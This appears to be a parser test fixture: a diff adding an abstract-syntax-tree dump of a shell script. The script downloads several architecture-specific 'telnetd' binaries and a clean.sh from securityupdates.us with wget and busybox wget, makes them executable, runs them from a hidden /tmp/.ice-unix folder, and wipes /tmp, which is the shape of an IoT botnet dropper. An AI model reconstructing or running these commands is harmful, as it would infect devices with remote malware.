@@ -1,0 +1,249 @@
+CommandNode(lineno=2, pos=(12, 19), parts=[
+  WordNode(lineno=2, pos=(12, 14), word='cd'),
+  WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+])
+CommandNode(lineno=3, pos=(20, 33), parts=[
+  WordNode(lineno=3, pos=(20, 22), word='rm'),
+  WordNode(lineno=3, pos=(23, 25), word='-f'),
+  WordNode(lineno=3, pos=(26, 33), word='/tmp/.*'),
+])
+CommandNode(lineno=4, pos=(34, 46), parts=[
+  WordNode(lineno=4, pos=(34, 36), word='rm'),
+  WordNode(lineno=4, pos=(37, 39), word='-f'),
+  WordNode(lineno=4, pos=(40, 46), word='/tmp/*'),
+])
+CommandNode(lineno=5, pos=(47, 86), parts=[
+  WordNode(lineno=5, pos=(47, 51), word='wget'),
+  WordNode(lineno=5, pos=(52, 86), word='http://securityupdates.us/clean.sh'),
+])
+CommandNode(lineno=6, pos=(87, 105), parts=[
+  WordNode(lineno=6, pos=(87, 92), word='chmod'),
+  WordNode(lineno=6, pos=(93, 96), word='a+x'),
+  WordNode(lineno=6, pos=(97, 105), word='clean.sh'),
+])
+CommandNode(lineno=7, pos=(106, 113), parts=[
+  WordNode(lineno=7, pos=(106, 108), word='cd'),
+  WordNode(lineno=7, pos=(109, 113), word='/tmp'),
+])
+CommandNode(lineno=8, pos=(114, 161), parts=[
+  WordNode(lineno=8, pos=(114, 121), word='busybox'),
+  WordNode(lineno=8, pos=(122, 126), word='wget'),
+  WordNode(lineno=8, pos=(127, 161), word='http://securityupdates.us/clean.sh'),
+])
+CommandNode(lineno=9, pos=(162, 180), parts=[
+  WordNode(lineno=9, pos=(162, 167), word='chmod'),
+  WordNode(lineno=9, pos=(168, 171), word='a+x'),
+  WordNode(lineno=9, pos=(172, 180), word='clean.sh'),
+])
+ListNode(lineno=10, pos=(181, 196), parts=[
+  CompoundNode(lineno=10, list=[
+    ReservedwordNode(lineno=10, pos=(181, 182), word='('),
+    CommandNode(lineno=10, pos=(182, 193), parts=[
+      WordNode(lineno=10, pos=(182, 184), word='sh'),
+      WordNode(lineno=10, pos=(185, 193), word='clean.sh'),
+    ]),
+    ReservedwordNode(lineno=10, pos=(193, 194), word=')'),
+  ], pos=(181, 194)),
+  OperatorNode(lineno=10, op='&', pos=(195, 196)),
+])
+CommandNode(lineno=11, pos=(197, 213), parts=[
+  WordNode(lineno=11, pos=(197, 202), word='mkdir'),
+  WordNode(lineno=11, pos=(203, 213), word='.ice-unix/'),
+])
+CommandNode(lineno=12, pos=(214, 231), parts=[
+  WordNode(lineno=12, pos=(214, 216), word='cd'),
+  WordNode(lineno=12, pos=(217, 231), word='/tmp/.ice-unix'),
+])
+CommandNode(lineno=13, pos=(232, 242), parts=[
+  WordNode(lineno=13, pos=(232, 234), word='rm'),
+  WordNode(lineno=13, pos=(235, 238), word='-rf'),
+  WordNode(lineno=13, pos=(239, 242), word='./*'),
+])
+CommandNode(lineno=14, pos=(243, 284), parts=[
+  WordNode(lineno=14, pos=(243, 247), word='wget'),
+  WordNode(discard=True, lineno=14, pos=(248, 284), word='http://securityupdates.us/telnetd_el'),
+])
+CommandNode(lineno=15, pos=(286, 306), parts=[
+  WordNode(lineno=15, pos=(286, 291), word='chmod'),
+  WordNode(lineno=15, pos=(292, 295), word='777'),
+  WordNode(discard=True, lineno=15, pos=(296, 306), word='telnetd_el'),
+])
+CommandNode(lineno=16, pos=(308, 320), parts=[
+  WordNode(lineno=16, pos=(308, 320), word='./telnetd_el'),
+])
+CommandNode(lineno=17, pos=(321, 336), parts=[
+  WordNode(lineno=17, pos=(321, 336), word='/tmp/telnetd_el'),
+])
+CommandNode(lineno=18, pos=(337, 359), parts=[
+  WordNode(lineno=18, pos=(337, 339), word='rm'),
+  WordNode(lineno=18, pos=(340, 342), word='-f'),
+  WordNode(lineno=18, pos=(343, 359), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=19, pos=(360, 399), parts=[
+  WordNode(lineno=19, pos=(360, 364), word='wget'),
+  WordNode(discard=True, lineno=19, pos=(365, 399), word='http://securityupdates.us/telnetds'),
+])
+CommandNode(lineno=20, pos=(401, 419), parts=[
+  WordNode(lineno=20, pos=(401, 406), word='chmod'),
+  WordNode(lineno=20, pos=(407, 410), word='777'),
+  WordNode(discard=True, lineno=20, pos=(411, 419), word='telnetds'),
+])
+CommandNode(lineno=21, pos=(421, 431), parts=[
+  WordNode(lineno=21, pos=(421, 431), word='./telnetds'),
+])
+CommandNode(lineno=22, pos=(432, 454), parts=[
+  WordNode(lineno=22, pos=(432, 434), word='rm'),
+  WordNode(lineno=22, pos=(435, 437), word='-f'),
+  WordNode(lineno=22, pos=(438, 454), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=23, pos=(455, 494), parts=[
+  WordNode(lineno=23, pos=(455, 459), word='wget'),
+  WordNode(discard=True, lineno=23, pos=(460, 494), word='http://securityupdates.us/telnetdm'),
+])
+CommandNode(lineno=24, pos=(496, 514), parts=[
+  WordNode(lineno=24, pos=(496, 501), word='chmod'),
+  WordNode(lineno=24, pos=(502, 505), word='777'),
+  WordNode(discard=True, lineno=24, pos=(506, 514), word='telnetdm'),
+])
+CommandNode(lineno=25, pos=(516, 526), parts=[
+  WordNode(lineno=25, pos=(516, 526), word='./telnetdm'),
+])
+CommandNode(lineno=26, pos=(527, 549), parts=[
+  WordNode(lineno=26, pos=(527, 529), word='rm'),
+  WordNode(lineno=26, pos=(530, 532), word='-f'),
+  WordNode(lineno=26, pos=(533, 549), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=27, pos=(550, 590), parts=[
+  WordNode(lineno=27, pos=(550, 554), word='wget'),
+  WordNode(discard=True, lineno=27, pos=(555, 590), word='http://securityupdates.us/telnetdpc'),
+])
+CommandNode(lineno=28, pos=(592, 611), parts=[
+  WordNode(lineno=28, pos=(592, 597), word='chmod'),
+  WordNode(lineno=28, pos=(598, 601), word='777'),
+  WordNode(discard=True, lineno=28, pos=(602, 611), word='telnetdpc'),
+])
+CommandNode(lineno=29, pos=(613, 624), parts=[
+  WordNode(lineno=29, pos=(613, 624), word='./telnetdpc'),
+])
+CommandNode(lineno=30, pos=(625, 647), parts=[
+  WordNode(lineno=30, pos=(625, 627), word='rm'),
+  WordNode(lineno=30, pos=(628, 630), word='-f'),
+  WordNode(lineno=30, pos=(631, 647), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=31, pos=(648, 688), parts=[
+  WordNode(lineno=31, pos=(648, 652), word='wget'),
+  WordNode(discard=True, lineno=31, pos=(653, 688), word='http://securityupdates.us/telnetdsh'),
+])
+CommandNode(lineno=32, pos=(690, 709), parts=[
+  WordNode(lineno=32, pos=(690, 695), word='chmod'),
+  WordNode(lineno=32, pos=(696, 699), word='777'),
+  WordNode(discard=True, lineno=32, pos=(700, 709), word='telnetdsh'),
+])
+CommandNode(lineno=33, pos=(711, 722), parts=[
+  WordNode(lineno=33, pos=(711, 722), word='./telnetdsh'),
+])
+CommandNode(lineno=34, pos=(723, 745), parts=[
+  WordNode(lineno=34, pos=(723, 725), word='rm'),
+  WordNode(lineno=34, pos=(726, 728), word='-f'),
+  WordNode(lineno=34, pos=(729, 745), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=35, pos=(746, 813), parts=[
+  WordNode(lineno=35, pos=(746, 753), word='busybox'),
+  WordNode(lineno=35, pos=(754, 758), word='wget'),
+  WordNode(lineno=35, pos=(759, 795), word='http://securityupdates.us/telnetd_el'),
+  WordNode(lineno=35, pos=(796, 798), word='-P'),
+  WordNode(discard=True, lineno=35, pos=(799, 813), word='/tmp/.ice-unix'),
+])
+CommandNode(lineno=36, pos=(815, 835), parts=[
+  WordNode(lineno=36, pos=(815, 820), word='chmod'),
+  WordNode(lineno=36, pos=(821, 824), word='777'),
+  WordNode(discard=True, lineno=36, pos=(825, 835), word='telnetd_el'),
+])
+CommandNode(lineno=37, pos=(837, 849), parts=[
+  WordNode(lineno=37, pos=(837, 849), word='./telnetd_el'),
+])
+CommandNode(lineno=38, pos=(850, 872), parts=[
+  WordNode(lineno=38, pos=(850, 852), word='rm'),
+  WordNode(lineno=38, pos=(853, 855), word='-f'),
+  WordNode(lineno=38, pos=(856, 872), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=39, pos=(873, 938), parts=[
+  WordNode(lineno=39, pos=(873, 880), word='busybox'),
+  WordNode(lineno=39, pos=(881, 885), word='wget'),
+  WordNode(lineno=39, pos=(886, 920), word='http://securityupdates.us/telnetds'),
+  WordNode(lineno=39, pos=(921, 923), word='-P'),
+  WordNode(discard=True, lineno=39, pos=(924, 938), word='/tmp/.ice-unix'),
+])
+CommandNode(lineno=40, pos=(940, 958), parts=[
+  WordNode(lineno=40, pos=(940, 945), word='chmod'),
+  WordNode(lineno=40, pos=(946, 949), word='777'),
+  WordNode(discard=True, lineno=40, pos=(950, 958), word='telnetds'),
+])
+CommandNode(lineno=41, pos=(960, 970), parts=[
+  WordNode(lineno=41, pos=(960, 970), word='./telnetds'),
+])
+CommandNode(lineno=42, pos=(971, 993), parts=[
+  WordNode(lineno=42, pos=(971, 973), word='rm'),
+  WordNode(lineno=42, pos=(974, 976), word='-f'),
+  WordNode(lineno=42, pos=(977, 993), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=43, pos=(994, 1059), parts=[
+  WordNode(lineno=43, pos=(994, 1001), word='busybox'),
+  WordNode(lineno=43, pos=(1002, 1006), word='wget'),
+  WordNode(lineno=43, pos=(1007, 1041), word='http://securityupdates.us/telnetdm'),
+  WordNode(lineno=43, pos=(1042, 1044), word='-P'),
+  WordNode(discard=True, lineno=43, pos=(1045, 1059), word='/tmp/.ice-unix'),
+])
+CommandNode(lineno=44, pos=(1061, 1079), parts=[
+  WordNode(lineno=44, pos=(1061, 1066), word='chmod'),
+  WordNode(lineno=44, pos=(1067, 1070), word='777'),
+  WordNode(discard=True, lineno=44, pos=(1071, 1079), word='telnetdm'),
+])
+CommandNode(lineno=45, pos=(1081, 1091), parts=[
+  WordNode(lineno=45, pos=(1081, 1091), word='./telnetdm'),
+])
+CommandNode(lineno=46, pos=(1092, 1114), parts=[
+  WordNode(lineno=46, pos=(1092, 1094), word='rm'),
+  WordNode(lineno=46, pos=(1095, 1097), word='-f'),
+  WordNode(lineno=46, pos=(1098, 1114), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=47, pos=(1115, 1181), parts=[
+  WordNode(lineno=47, pos=(1115, 1122), word='busybox'),
+  WordNode(lineno=47, pos=(1123, 1127), word='wget'),
+  WordNode(lineno=47, pos=(1128, 1163), word='http://securityupdates.us/telnetdpc'),
+  WordNode(lineno=47, pos=(1164, 1166), word='-P'),
+  WordNode(discard=True, lineno=47, pos=(1167, 1181), word='/tmp/.ice-unix'),
+])
+CommandNode(lineno=48, pos=(1183, 1202), parts=[
+  WordNode(lineno=48, pos=(1183, 1188), word='chmod'),
+  WordNode(lineno=48, pos=(1189, 1192), word='777'),
+  WordNode(discard=True, lineno=48, pos=(1193, 1202), word='telnetdpc'),
+])
+CommandNode(lineno=49, pos=(1204, 1215), parts=[
+  WordNode(lineno=49, pos=(1204, 1215), word='./telnetdpc'),
+])
+CommandNode(lineno=50, pos=(1216, 1238), parts=[
+  WordNode(lineno=50, pos=(1216, 1218), word='rm'),
+  WordNode(lineno=50, pos=(1219, 1221), word='-f'),
+  WordNode(lineno=50, pos=(1222, 1238), word='/tmp/.ice-unix/*'),
+])
+CommandNode(lineno=51, pos=(1239, 1305), parts=[
+  WordNode(lineno=51, pos=(1239, 1246), word='busybox'),
+  WordNode(lineno=51, pos=(1247, 1251), word='wget'),
+  WordNode(lineno=51, pos=(1252, 1287), word='http://securityupdates.us/telnetdsh'),
+  WordNode(lineno=51, pos=(1288, 1290), word='-P'),
+  WordNode(discard=True, lineno=51, pos=(1291, 1305), word='/tmp/.ice-unix'),
+])
+CommandNode(lineno=52, pos=(1307, 1326), parts=[
+  WordNode(lineno=52, pos=(1307, 1312), word='chmod'),
+  WordNode(lineno=52, pos=(1313, 1316), word='777'),
+  WordNode(discard=True, lineno=52, pos=(1317, 1326), word='telnetdsh'),
+])
+CommandNode(lineno=53, pos=(1328, 1339), parts=[
+  WordNode(lineno=53, pos=(1328, 1339), word='./telnetdsh'),
+])
+CommandNode(lineno=54, pos=(1340, 1362), parts=[
+  WordNode(lineno=54, pos=(1340, 1342), word='rm'),
+  WordNode(lineno=54, pos=(1343, 1345), word='-f'),
+  WordNode(lineno=54, pos=(1346, 1362), word='/tmp/.ice-unix/*'),
+])
